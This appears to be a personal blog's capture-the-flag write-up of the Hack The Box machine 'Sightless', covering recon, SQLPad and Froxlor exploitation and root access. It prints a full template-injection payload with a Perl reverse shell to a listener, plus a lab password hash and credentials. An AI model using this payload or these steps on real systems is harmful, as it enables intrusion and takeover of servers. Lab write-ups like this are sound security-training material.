@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>Linux - Easy - Sightless - abno&#39;s blog</title>
+  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">abno&#39;s blog</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">Linux - Easy - Sightless</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1726059097017"
+                  >2024-09-11 14:51</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1742156218881"
+                  >2025-03-16 21:16</time
+                ></span
+              >
+            </div>
+            
+            <div>
+              Keywords: 
+              <span class="keyword">sql</span>
+              
+              <span class="keyword">chrome</span>
+              
+              <span class="keyword">linux</span>
+              
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><h1 id="recon">Recon</h1>
+<div><pre class="hljs"><code>└──╼ $<span class="hljs-variable">nmap</span> <span class="hljs-operator">-</span><span class="hljs-variable">p</span><span class="hljs-operator">-</span> <span class="hljs-operator">-</span><span class="hljs-variable">A</span> <span class="hljs-number">10.129</span><span class="hljs-number">.160</span><span class="hljs-number">.92</span>
+<span class="hljs-title class_">Starting</span> <span class="hljs-title class_">Nmap</span> <span class="hljs-number">7.94</span>SVN ( <span class="hljs-variable">https</span>:<span class="hljs-comment">//nmap.org ) at 2024-09-11 14:59 UTC</span>
+<span class="hljs-title class_">Nmap</span> <span class="hljs-variable">scan</span> <span class="hljs-variable">report</span> <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span><span class="hljs-number">.160</span><span class="hljs-number">.92</span>
+<span class="hljs-title class_">Host</span> <span class="hljs-operator">is</span> <span class="hljs-title function_">up</span> (<span class="hljs-number">0.046</span>s <span class="hljs-variable">latency</span>).
+<span class="hljs-title class_">Not</span> <span class="hljs-variable">shown</span>: <span class="hljs-number">65532</span> <span class="hljs-variable">closed</span> <span class="hljs-variable">tcp</span> <span class="hljs-title function_">ports</span> (<span class="hljs-variable">conn</span><span class="hljs-operator">-</span><span class="hljs-variable">refused</span>)
+<span class="hljs-variable">PORT</span>   <span class="hljs-variable">STATE</span> <span class="hljs-variable">SERVICE</span> <span class="hljs-variable">VERSION</span>
+<span class="hljs-number">21</span>/<span class="hljs-variable">tcp</span> <span class="hljs-variable">open</span>  <span class="hljs-variable">ftp</span>
+<span class="hljs-operator">|</span> <span class="hljs-variable">fingerprint</span><span class="hljs-operator">-</span><span class="hljs-variable">strings</span>: 
+<span class="hljs-operator">|</span>   <span class="hljs-title class_">GenericLines</span>: 
+<span class="hljs-operator">|</span>     <span class="hljs-number">220</span> <span class="hljs-title class_">Pro</span>FTPD <span class="hljs-title class_">Server</span> (<span class="hljs-variable">sightless</span>.<span class="hljs-property">htb</span> <span class="hljs-variable">FTP</span> <span class="hljs-title class_">Server</span>) [::<span class="hljs-variable">ffff</span>:<span class="hljs-number">10.129</span><span class="hljs-number">.160</span><span class="hljs-number">.92</span>]
+<span class="hljs-operator">|</span>     <span class="hljs-title class_">Invalid</span> <span class="hljs-variable">command</span>: <span class="hljs-variable">try</span> <span class="hljs-variable">being</span> <span class="hljs-variable">more</span> <span class="hljs-variable">creative</span>
+<span class="hljs-operator">|</span><span class="hljs-variable">_</span>    <span class="hljs-title class_">Invalid</span> <span class="hljs-variable">command</span>: <span class="hljs-variable">try</span> <span class="hljs-variable">being</span> <span class="hljs-variable">more</span> <span class="hljs-variable">creative</span>
+<span class="hljs-number">22</span>/<span class="hljs-variable">tcp</span> <span class="hljs-variable">open</span>  <span class="hljs-variable">ssh</span>     <span class="hljs-title class_">Open</span>SSH <span class="hljs-number">8.9</span>p1 <span class="hljs-title class_">Ubuntu</span> <span class="hljs-number">3</span>ubuntu0<span class="hljs-number">.10</span> (<span class="hljs-title class_">Ubuntu</span> <span class="hljs-title class_">Linux</span>; <span class="hljs-variable">protocol</span> <span class="hljs-number">2.0</span>)
+<span class="hljs-operator">|</span> <span class="hljs-variable">ssh</span><span class="hljs-operator">-</span><span class="hljs-variable">hostkey</span>: 
+<span class="hljs-operator">|</span>   <span class="hljs-number">256</span> <span class="hljs-variable">c9</span>:<span class="hljs-number">6</span>e:<span class="hljs-number">3</span>b:<span class="hljs-number">8</span>f:<span class="hljs-variable">c6</span>:<span class="hljs-number">03</span>:<span class="hljs-number">29</span>:<span class="hljs-number">05</span>:<span class="hljs-variable">e5</span>:<span class="hljs-variable">a0</span>:<span class="hljs-variable">ca</span>:<span class="hljs-number">00</span>:<span class="hljs-number">90</span>:<span class="hljs-variable">c9</span>:<span class="hljs-number">5</span>c:<span class="hljs-number">52</span> (<span class="hljs-variable">ECDSA</span>)
+<span class="hljs-operator">|</span><span class="hljs-variable">_</span>  <span class="hljs-number">256</span> <span class="hljs-number">9</span>b:<span class="hljs-variable">de</span>:<span class="hljs-number">3</span>a:<span class="hljs-number">27</span>:<span class="hljs-number">77</span>:<span class="hljs-number">3</span>b:<span class="hljs-number">1</span>b:<span class="hljs-variable">e1</span>:<span class="hljs-number">19</span>:<span class="hljs-number">5</span>f:<span class="hljs-number">16</span>:<span class="hljs-number">11</span>:<span class="hljs-variable">be</span>:<span class="hljs-number">70</span>:<span class="hljs-variable">e0</span>:<span class="hljs-number">56</span> (<span class="hljs-variable">ED25519</span>)
+<span class="hljs-number">80</span>/<span class="hljs-variable">tcp</span> <span class="hljs-variable">open</span>  <span class="hljs-variable">http</span>    <span class="hljs-variable">nginx</span> <span class="hljs-number">1.18</span><span class="hljs-number">.0</span> (<span class="hljs-title class_">Ubuntu</span>)
+<span class="hljs-operator">|</span><span class="hljs-variable">_http</span><span class="hljs-operator">-</span><span class="hljs-variable">title</span>: <span class="hljs-title class_">Did</span> <span class="hljs-variable">not</span> <span class="hljs-variable">follow</span> <span class="hljs-variable">redirect</span> <span class="hljs-variable">to</span> <span class="hljs-variable">http</span>:<span class="hljs-comment">//sightless.htb/</span>
+<span class="hljs-operator">|</span><span class="hljs-variable">_http</span><span class="hljs-operator">-</span><span class="hljs-variable">server</span><span class="hljs-operator">-</span><span class="hljs-variable">header</span>: <span class="hljs-variable">nginx</span>/<span class="hljs-number">1.18</span><span class="hljs-number">.0</span> (<span class="hljs-title class_">Ubuntu</span>)
+<span class="hljs-number">1</span> <span class="hljs-variable">service</span> <span class="hljs-variable">unrecognized</span> <span class="hljs-variable">despite</span> returning <span class="hljs-variable">data</span>. <span class="hljs-title class_">If</span> <span class="hljs-variable">you</span> <span class="hljs-variable">know</span> <span class="hljs-variable">the</span> <span class="hljs-variable">service</span>/<span class="hljs-variable">version</span>, <span class="hljs-variable">please</span> <span class="hljs-variable">submit</span> <span class="hljs-variable">the</span> <span class="hljs-variable">following</span> <span class="hljs-variable">fingerprint</span> <span class="hljs-variable">at</span> <span class="hljs-variable">https</span>:<span class="hljs-comment">//nmap.org/cgi-bin/submit.cgi?new-service :</span>
+<span class="hljs-variable">SF</span><span class="hljs-operator">-</span><span class="hljs-title class_">Port</span>21<span class="hljs-operator">-</span><span class="hljs-variable">TCP</span>:<span class="hljs-variable">V</span><span class="hljs-operator">=</span><span class="hljs-number">7.94</span>SVN<span class="hljs-operator">%</span><span class="hljs-variable">I</span><span class="hljs-operator">=</span><span class="hljs-number">7</span><span class="hljs-operator">%</span><span class="hljs-variable">D</span><span class="hljs-operator">=</span><span class="hljs-number">9</span>/<span class="hljs-number">11</span><span class="hljs-operator">%</span><span class="hljs-title class_">Time</span><span class="hljs-operator">=</span><span class="hljs-number">66E1</span>B055<span class="hljs-operator">%</span><span class="hljs-variable">P</span><span class="hljs-operator">=</span><span class="hljs-variable">x86_64</span><span class="hljs-operator">-</span><span class="hljs-variable">pc</span><span class="hljs-operator">-</span><span class="hljs-variable">linux</span><span class="hljs-operator">-</span><span class="hljs-variable">gnu</span><span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-variable">G</span>
+<span class="hljs-variable">SF</span>:<span class="hljs-variable">enericLines</span>,<span class="hljs-variable">A2</span>,<span class="hljs-string">"220<span class="hljs-char escape_">\x20</span>ProFTPD<span class="hljs-char escape_">\x20</span>Server<span class="hljs-char escape_">\x20</span>\(sightless\.htb<span class="hljs-char escape_">\x20</span>FTP<span class="hljs-char escape_">\x20</span>
+SF:Server\)<span class="hljs-char escape_">\x20</span>\[::ffff:10\.129\.160\.92\]<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>500<span class="hljs-char escape_">\x20</span>Invalid<span class="hljs-char escape_">\x20</span>command:\x
+SF:20try<span class="hljs-char escape_">\x20</span>being<span class="hljs-char escape_">\x20</span>more<span class="hljs-char escape_">\x20</span>creative<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>500<span class="hljs-char escape_">\x20</span>Invalid<span class="hljs-char escape_">\x20</span>command:<span class="hljs-char escape_">\x20</span>try
+SF:<span class="hljs-char escape_">\x20</span>being<span class="hljs-char escape_">\x20</span>more<span class="hljs-char escape_">\x20</span>creative<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>"</span>);
+<span class="hljs-title class_">Service</span> <span class="hljs-title class_">Info</span>: <span class="hljs-variable">OS</span>: <span class="hljs-title class_">Linux</span>; <span class="hljs-variable">CPE</span>: <span class="hljs-variable">cpe</span>:/<span class="hljs-variable">o</span>:<span class="hljs-variable">linux</span>:<span class="hljs-variable">linux_kernel</span>
+
+<span class="hljs-title class_">Service</span> <span class="hljs-variable">detection</span> <span class="hljs-variable">performed</span>. <span class="hljs-title class_">Please</span> <span class="hljs-variable">report</span> <span class="hljs-variable">any</span> incorrect <span class="hljs-variable">results</span> <span class="hljs-variable">at</span> <span class="hljs-variable">https</span>:<span class="hljs-comment">//nmap.org/submit/ .</span>
+<span class="hljs-title class_">Nmap</span> <span class="hljs-variable">done</span>: <span class="hljs-number">1</span> <span class="hljs-variable">IP</span> <span class="hljs-title function_">address</span> (<span class="hljs-number">1</span> <span class="hljs-variable">host</span> <span class="hljs-variable">up</span>) <span class="hljs-variable">scanned</span> <span class="hljs-keyword">in</span> <span class="hljs-number">80.98</span> <span class="hljs-variable">seconds</span></code></pre></div>
+<p>Dirsearch finds nothing of value, no subdomains with gobuster found either.</p>
+<p>Main site<br />
+<img src="/_resources/7f57cdac66824668a21c8df524ee1eb9.png" /></p>
+<p>Walking around the site we can find nice SQLPad site<br />
+<img src="/_resources/7d873517bf15494ca521e19f5bb2af0b.png" /></p>
+<p>We can learn its version too.<br />
+<img src="/_resources/175603cd5afc48899a8ab7f6e8f87bdd.png" /></p>
+<p>Sure enough, there is a <a title="https://nvd.nist.gov/vuln/detail/CVE-2022-0944" href="https://nvd.nist.gov/vuln/detail/CVE-2022-0944">CVE</a> for it (its an easy box after all)</p>
+<h1 id="cve-2022-0944">CVE-2022-0944</h1>
+<p>All of it is described here:<br />
+<a title="https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb" href="https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb">https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb</a></p>
+<p>TLDR: Set listener on port 4444 and add new connection with driver MySQL amd database<code>{{ process.mainModule.require('child_process').exec('perl -e \'use Socket;$i="10.10.10.10";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};\'') }}</code>. Nice name.</p>
+<p><img src="/_resources/04102ec0fe654fe191dd328543656658.png" /></p>
+<p>We are in. Trying to do standard shell stabilisation with <code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code> gives us <code>python3: not found</code>. Whoami gives “root” so we are probably in a container, with flag nowhere in sight.</p>
+<p>Running linenum.sh confirms our fears.</p>
+<p><img src="/_resources/ecde2e2f1bd04149bdf0b9a00833ac12.png" /></p>
+<p>It also shows that we have an additional entry in /etc/shadow file. Probably the pass for ssh.</p>
+<p><code>michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::</code></p>
+<p><img src="/_resources/8b9a164c14f943549ce928e8c7a2a8d9.png" /></p>
+<p>Running john gets us:<br />
+blindside        (root)<br />
+insaneclownposse (michael)</p>
+<p>We are in via ssh, as predicted.</p>
+<h1 id="priv-esc">Priv esc</h1>
+<p>Running linenum again.</p>
+<p>in /etc.daily we can see:clear</p>
+<p><code>lrwxrwxrwx   1 root root   37 May 14 22:24 google-chrome -&gt; /opt/google/chrome/cron/google-chrome</code></p>
+<div><pre class="hljs"><code>michael<span class="hljs-variable">@sightless</span><span class="hljs-symbol">:/opt/google/chrome</span><span class="hljs-variable">$ </span>google-chrome --version
+Google Chrome <span class="hljs-number">125.0</span>.<span class="hljs-number">6422.60</span> </code></pre></div>
+<p>Once again we can get a <a title="https://nvd.nist.gov/vuln/detail/CVE-2024-4947" href="https://nvd.nist.gov/vuln/detail/CVE-2024-4947">CVE for chrome</a></p>
+<p><a title="https://buptsb.github.io/blog/post/CVE-2024-4947-%20v8%20incorrect%20AccessInfo%20for%20module%20namespace%20object%20causes%20Maglev%20type%20confusion.html" href="https://buptsb.github.io/blog/post/CVE-2024-4947-%20v8%20incorrect%20AccessInfo%20for%20module%20namespace%20object%20causes%20Maglev%20type%20confusion.html">https://buptsb.github.io/blog/post/CVE-2024-4947- v8 incorrect AccessInfo for module namespace object causes Maglev type confusion.html</a></p>
+<p>Reading more output from linenum, we can find more info about john (user with higher privs) and chrome.</p>
+<div><pre class="hljs"><code>john        1647  0.0  0.6  33660 24580 ?        S    14<span class="hljs-function">:51</span>   0<span class="hljs-function">:04</span> <span class="hljs-string">/usr/bin/python3</span> <span class="hljs-string">/home/john/automation/administration.py</span>
+john        1648  0.3  0.3 33630172 15408 ?      Sl   14<span class="hljs-function">:51</span>   0<span class="hljs-function">:31</span> <span class="hljs-string">/home/john/automation/chromedriver</span> <span class="hljs-params">--port=40373</span>
+john        1653  0.0  0.0      0     0 ?        Z    14<span class="hljs-function">:51</span>   0<span class="hljs-function">:00</span> [chromedriver] &lt;defunct&gt;
+john        1659  0.6  2.8 34003124 114052 ?     Sl   14<span class="hljs-function">:51</span>   0<span class="hljs-function">:52</span> <span class="hljs-string">/opt/google/chrome/chrome</span> <span class="hljs-params">--allow-pre-commit-input</span> <span class="hljs-params">--disable-background-networking</span> <span class="hljs-params">--disable-client-side-phishing-detection</span> <span class="hljs-params">--disable-default-apps</span> <span class="hljs-params">--disable-dev-shm-usage</span> <span class="hljs-params">--disable-hang-monitor</span> <span class="hljs-params">--disable-popup-blocking</span> <span class="hljs-params">--disable-prompt-on-repost</span> <span class="hljs-params">--disable-sync</span> <span class="hljs-params">--enable-automation</span> <span class="hljs-params">--enable-logging</span> <span class="hljs-params">--headless</span> <span class="hljs-params">--log-level=0</span> <span class="hljs-params">--no-first-run</span> <span class="hljs-params">--no-sandbox</span> <span class="hljs-params">--no-service-autorun</span> <span class="hljs-params">--password-store=basic</span> <span class="hljs-params">--remote-debugging-port=0</span> <span class="hljs-params">--test-type=webdriver</span> <span class="hljs-params">--use-mock-keychain</span> <span class="hljs-params">--user-data-dir=/tmp/</span><span class="hljs-string">.org.chromium.Chromium.5cgJoJ</span> data:,
+john        1661  0.0  0.0 33575860 3044 ?       Sl   14<span class="hljs-function">:51</span>   0<span class="hljs-function">:00</span> <span class="hljs-string">/opt/google/chrome/chrome_crashpad_handler</span> <span class="hljs-params">--monitor-self-annotation=ptype=crashpad-handler</span> <span class="hljs-params">--database=/tmp/Crashpad</span> <span class="hljs-params">--url=https</span>:<span class="hljs-string">//clients2.google.com/cr/report</span> <span class="hljs-params">--annotation=channel=</span> <span class="hljs-params">--annotation=lsb-release=Ubuntu</span> 22.04.4 LTS <span class="hljs-params">--annotation=plat=Linux</span> <span class="hljs-params">--annotation=prod=Chrome_Headless</span> <span class="hljs-params">--annotation=ver=125</span>.0.6422.60 <span class="hljs-params">--initial-client-fd=6</span> <span class="hljs-params">--shared-client-connection</span>
+john        1665  0.0  1.4 34112452 56388 ?      S    14<span class="hljs-function">:51</span>   0<span class="hljs-function">:00</span> <span class="hljs-string">/opt/google/chrome/chrome</span> <span class="hljs-params">--type=zygote</span> <span class="hljs-params">--no-zygote-sandbox</span> <span class="hljs-params">--no-sandbox</span> <span class="hljs-params">--enable-logging</span> <span class="hljs-params">--headless</span> <span class="hljs-params">--log-level=0</span> <span class="hljs-params">--headless</span> <span class="hljs-params">--crashpad-handler-pid=1661</span> <span class="hljs-params">--enable-crash-reporter</span>
+john        1666  0.0  1.4 34112456 56896 ?      S    14<span class="hljs-function">:51</span>   0<span class="hljs-function">:00</span> <span class="hljs-string">/opt/google/chrome/chrome</span> <span class="hljs-params">--type=zygote</span> <span class="hljs-params">--no-sandbox</span> <span class="hljs-params">--enable-logging</span> <span class="hljs-params">--headless</span> <span class="hljs-params">--log-level=0</span> <span class="hljs-params">--headless</span> <span class="hljs-params">--crashpad-handler-pid=1661</span> <span class="hljs-params">--enable-crash-reporter</span>
+john        1681  0.3  3.0 34362348 119676 ?     Sl   14<span class="hljs-function">:51</span>   0<span class="hljs-function">:31</span> <span class="hljs-string">/opt/google/chrome/chrome</span> <span class="hljs-params">--type=gpu-process</span> <span class="hljs-params">--no-sandbox</span> <span class="hljs-params">--disable-dev-shm-usage</span> <span class="hljs-params">--headless</span> <span class="hljs-params">--ozone-platform=headless</span> <span class="hljs-params">--use-angle=swiftshader-webgl</span> <span class="hljs-params">--headless</span> <span class="hljs-params">--crashpad-handler-pid=1661</span> <span class="hljs-params">--gpu-preferences=WAAAAAAAAAAgAAAMAAAAAAAAAAAAAAAAAABgAAEAAAA4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAAAAAAAYAAAAAAAAAAgAAAAAAAAACAAAAAAAAAAIAAAAAAAAAA==</span> <span class="hljs-params">--use-gl=angle</span> <span class="hljs-params">--shared-files</span> <span class="hljs-params">--fie</span>
+john        1682  0.1  2.1 33900068 86384 ?      Sl   14<span class="hljs-function">:51</span>   0<span class="hljs-function">:11</span> <span class="hljs-string">/opt/google/chrome/chrome</span> <span class="hljs-params">--type=utility</span> <span class="hljs-params">--utility-sub-type=network</span>.mojom.NetworkService <span class="hljs-params">--lang=en-US</span> <span class="hljs-params">--service-sandbox-type=none</span> <span class="hljs-params">--no-sandbox</span> <span class="hljs-params">--disable-dev-shm-usage</span> <span class="hljs-params">--use-angle=swiftshader-webgl</span> <span class="hljs-params">--use-gl=angle</span> <span class="hljs-params">--headless</span> <span class="hljs-params">--crashpad-handler-pid=1661</span> <span class="hljs-params">--shared-files=v8_context_snapshot_data</span><span class="hljs-function">:100</span> <span class="hljs-params">--field-trial-handle=3</span>,i,15292266550865892519,2896309854822872465,262144 <span class="hljs-params">--disable-features=PaintHolding</span> <span class="hljs-params">--variations-seed-version</span> <span class="hljs-params">--enable-logging</span> <span class="hljs-params">--log-level=0</span> <span class="hljs-params">--enable-crash-reporter</span>
+john        1710  3.0  4.5 1186799476 178872 ?   Sl   14<span class="hljs-function">:51</span>   4<span class="hljs-function">:06</span> <span class="hljs-string">/opt/google/chrome/chrome</span> <span class="hljs-params">--type=renderer</span> <span class="hljs-params">--headless</span> <span class="hljs-params">--crashpad-handler-pid=1661</span> <span class="hljs-params">--no-sandbox</span> <span class="hljs-params">--disable-dev-shm-usage</span> <span class="hljs-params">--enable-automation</span> <span class="hljs-params">--remote-debugging-port=0</span> <span class="hljs-params">--test-type=webdriver</span> <span class="hljs-params">--allow-pre-commit-input</span> <span class="hljs-params">--ozone-platform=headless</span> <span class="hljs-params">--disable-gpu-compositing</span> <span class="hljs-params">--lang=en-US</span> <span class="hljs-params">--num-raster-threads=1</span> <span class="hljs-params">--renderer-client-id=5</span> <span class="hljs-params">--time-ticks-at-unix-epoch=-1726066167952305</span> <span class="hljs-params">--launc</span></code></pre></div>
+<p>We learn that chrome is running in headless mode, so there is no need to do tunneling. There is also “/automation/administration.py” file. We can read also about Chromedriver, which is often used for chrome automation. We also know that it is on port 40373.</p>
+<p>running pspy we can also find that evert 60 seconds there is <code>bin/bash /home/john/automation/healthcheck.sh</code> running.</p>
+<p>There is no d8 that we could use from the console, and it is needed to run the CVE. After a bit of stumbling I’ve decided to connect to chromedriver using browser.</p>
+<p>Found this <a title="https://dev.to/berthaw82414312/guide-to-chrome-remote-debugging-3ok7" href="https://dev.to/berthaw82414312/guide-to-chrome-remote-debugging-3ok7">dev.to guide</a>.</p>
+<div><pre class="hljs"><code>ssh -L <span class="hljs-number">40373</span>:<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">40373</span> michael@<span class="hljs-number">10.129</span>.<span class="hljs-number">160.92</span>
+<span class="hljs-regexp">/usr/</span>bin/google-chrome --remote-debugging-port=<span class="hljs-number">40373</span>
+chrome:<span class="hljs-regexp">//i</span>nspect/<span class="hljs-comment">#devices</span></code></pre></div>
+<p><img src="/_resources/f3560d812ba344a4bf0f3d5ba183d7de.png" /></p>
+<p>…and it doesnt work.</p>
+<p><img src="/_resources/151bad01c1494a77adfcc2212350455f.png" /></p>
+<div><pre class="hljs"><code><span class="hljs-attribute">michael</span>@sightless:~$ ss -tulpn
+<span class="hljs-attribute">Netid</span>           State            Recv-Q           Send-Q                       Local Address:Port                        Peer Address:Port           
+<span class="hljs-attribute">udp</span>             UNCONN           <span class="hljs-number">0</span>                <span class="hljs-number">0</span>                            <span class="hljs-number">127.0.0.53</span>%lo:<span class="hljs-number">53</span>                               <span class="hljs-number">0.0.0.0</span>:*                              
+<span class="hljs-attribute">udp</span>             UNCONN           <span class="hljs-number">0</span>                <span class="hljs-number">0</span>                                  <span class="hljs-number">0.0.0.0:68</span>                               <span class="hljs-number">0.0.0.0</span>:*                              
+<span class="hljs-attribute">tcp</span>             LISTEN           <span class="hljs-number">0</span>                <span class="hljs-number">4096</span>                             <span class="hljs-number">127.0.0.1:3000</span>                             <span class="hljs-number">0.0.0.0</span>:*                              
+<span class="hljs-attribute">tcp</span>             LISTEN           <span class="hljs-number">0</span>                <span class="hljs-number">4096</span>                         <span class="hljs-number">127.0.0.53</span>%lo:<span class="hljs-number">53</span>                               <span class="hljs-number">0.0.0.0</span>:*                              
+<span class="hljs-attribute">tcp</span>             LISTEN           <span class="hljs-number">0</span>                <span class="hljs-number">70</span>                               <span class="hljs-number">127.0.0.1:33060</span>                            <span class="hljs-number">0.0.0.0</span>:*                              
+<span class="hljs-attribute">tcp</span>             LISTEN           <span class="hljs-number">0</span>                <span class="hljs-number">4096</span>                             <span class="hljs-number">127.0.0.1:40517</span>                            <span class="hljs-number">0.0.0.0</span>:*                              
+<span class="hljs-attribute">tcp</span>             LISTEN           <span class="hljs-number">0</span>                <span class="hljs-number">10</span>                               <span class="hljs-number">127.0.0.1:34763</span>                            <span class="hljs-number">0.0.0.0</span>:*                              
+<span class="hljs-attribute">tcp</span>             LISTEN           <span class="hljs-number">0</span>                <span class="hljs-number">128</span>                                <span class="hljs-number">0.0.0.0:22</span>                               <span class="hljs-number">0.0.0.0</span>:*                              
+<span class="hljs-attribute">tcp</span>             LISTEN           <span class="hljs-number">0</span>                <span class="hljs-number">511</span>                              <span class="hljs-number">127.0.0.1:8080</span>                             <span class="hljs-number">0.0.0.0</span>:*                              
+<span class="hljs-attribute">tcp</span>             LISTEN           <span class="hljs-number">0</span>                <span class="hljs-number">511</span>                                <span class="hljs-number">0.0.0.0:80</span>                               <span class="hljs-number">0.0.0.0</span>:*                              
+<span class="hljs-attribute">tcp</span>             LISTEN           <span class="hljs-number">0</span>                <span class="hljs-number">151</span>                              <span class="hljs-number">127.0.0.1:3306</span>                             <span class="hljs-number">0.0.0.0</span>:*                              
+<span class="hljs-attribute">tcp</span>             LISTEN           <span class="hljs-number">0</span>                <span class="hljs-number">5</span>                                <span class="hljs-number">127.0.0.1:40373</span>                            <span class="hljs-number">0.0.0.0</span>:*                              
+<span class="hljs-attribute">tcp</span>             LISTEN           <span class="hljs-number">0</span>                <span class="hljs-number">128</span>                                      *:<span class="hljs-number">21</span>                                     *:*                              
+<span class="hljs-attribute">tcp</span>             LISTEN           <span class="hljs-number">0</span>                <span class="hljs-number">128</span>                                  <span class="hljs-meta"> [::]:22                                  [::]:*                              </span></code></pre></div>
+<p>So tunneling via ssh again <code>ssh -L 8080:127.0.0.1:8080 michael@10.129.160.92</code> gets us:</p>
+<p><img src="/_resources/3c19505935484b9ebee01c4ab14701bc.png" /></p>
+<p>Its the foxlor that we could have read on the main site.</p>
+<p><img src="/_resources/748fc8191f3d4596971c51f5531284a5.png" /></p>
+<p>After seeing the domain error, I’ve changed address from <code>localhost:8080</code> to <code>127.0.0.1:8080</code> and was greeted with a nice login page.</p>
+<p><img src="/_resources/15b2c26b281f46508bf9f65ef4147850.png" /></p>
+<p>Our username and password doesnt work here though. There was no direct exploit, so I’ve went back to exploring ports.</p>
+<p><code>ssh -L 33060:127.0.0.1:33060 \     -L 40517:127.0.0.1:40517 \     -L 34763:127.0.0.1:34763 \     -L 3306:127.0.0.1:3306 \     -L 40373:127.0.0.1:40373 \     michael@10.129.160.92</code></p>
+<p>Trying to add ports again to remote debugger and it works with <code>127.0.0.1:34763</code>.</p>
+<p><img src="/_resources/9dbd8567fd734376beb90d9da39c42db.png" /></p>
+<p>Upon clicking inspect, we can see some magic going on. First we can see Froxlor page.</p>
+<p><img src="/_resources/855c3609abc846f489860de4a7fae101.png" /></p>
+<p>Then we can see the password being typed automaticly, probably by the healthcheck.sh script.We can see then this dashboard and finally we are logged out.</p>
+<p><img src="/_resources/533dd2059583480c8271562030f94830.png" /></p>
+<p>We can then press ctrl+e to capture all of the traffic in the inspector and press it again to stop after full cycle. We can inspect all of the packages then in peace. In index.php we can find username <code>Admin</code> and password <code>ForlorfroxAdmin</code>.</p>
+<p><img src="/_resources/820a149f01f04995a306fc77afac0b1c.png" /></p>
+<p>Going back to the 8080 port and we can log in.</p>
+<p><img src="/_resources/e0f766e3ffd74cdbabc4d9d7d348af5b.png" /></p>
+<p>I’ve thinkered for way too long with adding a php reverse shell to the site and then executing it. I’ve tried creating more subdomains too, but none of it worked. I’ve ended up abusing the php-fpm restart command.</p>
+<p><img src="/_resources/e2011b51c32d445cbd10c3d29d79fb49.png" /></p>
+<p>I’ve tried using also netcat reverse shell, but the -e parameter is blocked. I tried also bash reverse shell, but the use of special chars like “&amp;” and “&gt;” is blocked. That is why I ended up creating it in a file. Then going to Settings &gt;&gt; PHP-FPM allows us to restart it, by toggling the switch on and off.</p>
+<p><img src="/_resources/df0a396a6e9d45638eb849ee2b3299af.png" /></p>
+<p>After <strong>waiting for a while</strong>, I got the shell with root access. It is neccessary to wait after each try, as the command is executed every 5 min by a cron job.</p>
+<p><img src="/_resources/0eda38eaf1624a9f8a9709c17d2b14aa.png" /></p>
+<p>Cool box.</p>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
